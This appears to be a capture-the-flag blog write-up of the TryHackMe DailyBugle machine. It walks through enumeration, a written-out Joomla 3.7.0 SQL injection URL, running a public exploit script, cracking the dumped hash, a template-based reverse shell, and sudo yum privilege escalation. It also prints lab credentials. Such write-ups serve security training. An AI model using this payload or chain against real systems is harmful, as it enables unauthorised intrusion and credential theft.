---
layout: single
title: DailyBugle - TryHackMe (OSCP STYLE)
excerpt: "Welcome to DailyBugle CTF machine! This challenge involves exploiting a vulnerable version of Joomla, plaintext passwords, and an escalation of privileges through yum. Your objective is to gain access to the system by identifying and exploiting these vulnerabilities."
date: 2023-05-14
classes: wide
header:
  teaser: /assets/images/dailybugle/portada.png
  teaser_home_page: true
categories:
  - TryHackMe
  - infosec
tags:
  - TryHackMe
  - Linux
  - Joomla 3.7.0
  - Lateral Priv Escalation
  - Yum SUDO permissions
---

## Enumeration

As in all write-ups, we will start by checking if we have connectivity with the machine, in this case we see that it does give us a response and furthermore we can deduce from its TTL that it is a Linux machine.

![1]

We perform the usual scan that can be seen in all my write-ups.

```
sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -n -Pn 10.10.122.9 -oG allPorts
```

![2]

  `sudo`: Runs the command with administrative privileges.
-   `nmap`: The command we are running.
-   `-p-`: Scans all ports.
-   `-sS`: Uses a SYN scan to determine the state of the ports.
-   `--min-rate 5000`: Sets the minimum packet sending rate to 5000 packets per second.
-   `--open`: Shows only open ports.
-   `-T5`: Sets the timing template to 5, which makes the scan faster but also more aggressive.
-   `-vvv`: Sets the verbosity level to 3, which provides more detailed output.
-   `-n`: Treats all hostnames as IPs, skipping DNS resolution.
-   `-Pn`: Skips host discovery by not sending an ICMP ping.
-   `10.10.122.9`: The IP address of the target machine to be scanned.
-   `-oG allPorts`: Outputs the results in the grepable format to a file named "allPorts".

We found 3 open ports, on first instance the one which stands out is the por 80 and 3306, the first one indicates that this machine is hosting a web site and the second one indicates that this machine has a SQL instance running behind.

Running a nmap scan with the Version flag activated, we extract some information about the machine

![3]

This machine has different paths on his website and we are able to know that we are facing a Apache/2.4.6 (CentOS) PHP/5.6.40 and is a Joomla cms

Also we could know that the SQL instance is mysql  MariaDB 

## Initial Access 

![4]

On first instance we found a main page with a login form and one post that relates that Spider-Man robs a bank.

We start fuzzing the page with wfuzz tool in order to find other directories or paths that could be vulnerable.

```
┌──(kali㉿kali)-[~/Documents/THM/DailyBugle/nmap]
└─$ wfuzz --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.122.9/FUZZ 
```

![5]

If we navigate to the administrator path, we found other login form

![6]


After trying the basics SQLi querys to bypass the login,  I decided to continue enumerating the site trying to get the Joomla CMS version, after a long research I found a page that helped me to get the version with the following path 

```
http://10.10.122.9/administrator/manifests/files/joomla.xml
```

![7]

Now knowing that the version is the 3.7.0 I started to search vulnerabilites for it, i found a common exploit that allows to retrieve information from de database [GitHub](https://github.com/XiphosResearch/exploits/blob/44bf14da73220467410c2d952c33638281c47954/Joomblah/joomblah.py#L52)
I tried to find out the way to do a complete manual sqli but I couldn't

```
http://10.10.122.9/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=UpdateXML(2,%20concat(0x3a,(SELECT%20schema_name%20from%20information_schema.schemata),%200x3a),%201)
```

![8]

After understand how the exploit works and try by my self I decided to use the python exploit, the objective is to not use SQLMap tool, but I'm not sure if this script is allowed in the OSCP certification

```
┌──(kali㉿kali)-[~/Documents/THM/DailyBugle/exploits]
└─$ python3 joomblah.py http://10.10.122.9

```

![9]
We found 1 user with his hashed password

User: Jonah
Pass: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm

Since we have his hash we'll use this to crack it with John tool

We create a file called john.hash with the following information

```
jonah:$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```

The command is: `john --crack-status john.hash` or `hashcat -m 3200 -a 0 hash /usr/share/wordlists/rockyou.txt`

![12]

```
Pass:spiderman123
```

After getting the cracked password we are able to login into the admin panel, the way to get a reverse shell is similar in all CMS, we'll navigate to template tab and replace the php code of index.php for our customize php code that we can call navigating to the main page

![11]

When we go to the index.php page we establish a reverse shell as apache user 

![10]

We do a TTY interactive console with the followiong commands

```
script /dev/null -c bash

CTRL + Z

stty raw -echo; fg

reset xterm

export TERM=xterm

export SHELL=bash

stty size

X X

stty rows X colums Xstty rows X colums X
```

Due the low privileges that has our user, we have to try to migrate to an user more privileged, we start enumerating Capabilities, CronJobs, SUID, Sudo....

We decided to enumerate the writable folders 

```
find / -writable -type d 2>/dev/null
```

And we found the `/var/www/html/configuration.php`

This file is important, inside this file always we can find out clear text credentials

![13]

The clear text password that we found is `nv5uz9r3ZEDzVjNu`


![14]

## Privilege Escalation

After gaining access, we need to re-list the permissions held by the new user.
We observed that this user can use the yum binary with sudo permissions.

If we investigate a bit on the [GTFOBins](https://gtfobins.github.io/gtfobins/yum/#sudo) page, we can find information about the binary

There are several ways to achieve privilege escalation by exploiting this binary. One way is to craft an RPM package and use a tool, while the other is a more manual approach, so we will opt for the latter. We just have to follow the steps of the machine and we will get a root shell.

![15]

![16]




[1]:/assets/images/dailybugle/1.png
[2]:/assets/images/dailybugle/2.png
[3]:/assets/images/dailybugle/3.png
[4]:/assets/images/dailybugle/4.png
[5]:/assets/images/dailybugle/5.png
[6]:/assets/images/dailybugle/6.png
[7]:/assets/images/dailybugle/7.png
[8]:/assets/images/dailybugle/8.png
[9]:/assets/images/dailybugle/9.png
[10]:/assets/images/dailybugle/10.png
[11]:/assets/images/dailybugle/11.png
[12]:/assets/images/dailybugle/12.png
[13]:/assets/images/dailybugle/13.png
[14]:/assets/images/dailybugle/14.png
[15]:/assets/images/dailybugle/15.png
[16]:/assets/images/dailybugle/16.png
